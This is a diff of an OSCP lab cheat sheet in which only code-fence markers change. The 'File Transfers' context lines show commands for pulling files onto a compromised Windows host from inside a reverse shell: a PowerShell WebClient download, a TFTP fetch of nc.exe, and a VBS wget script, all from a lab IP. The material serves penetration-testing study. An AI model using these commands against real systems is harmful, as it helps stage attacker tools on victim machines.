@@ -88,7 +88,7 @@ During my time at the PWK labs and for my OSCP preparation, I gathered a big amo
 
 ## File Transfers
 
-'''HTTP
+```HTTP
 # In Kali
 python -m SimpleHTTPServer 80
 
@@ -97,9 +97,9 @@ wget 10.10.10.10/file
 
 # In reverse shell - Windows
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
-'''
+```
 
-'''FTP
+```FTP
 # In Kali
 python -m pyftpdlib -p 21 -w
 
@@ -115,17 +115,17 @@ echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 
 “Name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.”
-'''
+```
 
-'''TFTP
+```TFTP
 # In Kali
 atftpd --daemon --port 69 /tftp
 
 # In reverse shell
 tftp -i 10.10.10.10 GET nc.exe
-'''
+```
 
-'''VBS
+```VBS
 If FTP/TFTP fails you, this wget script in VBS is the go to on Windows machines.
 
 # In reverse shell
@@ -157,4 +157,4 @@ echo ts.Close >> wget.vbs
 
 # Execute
 cscript wget.vbs http://10.10.10.10/file.exe file.exe
-'''
+```
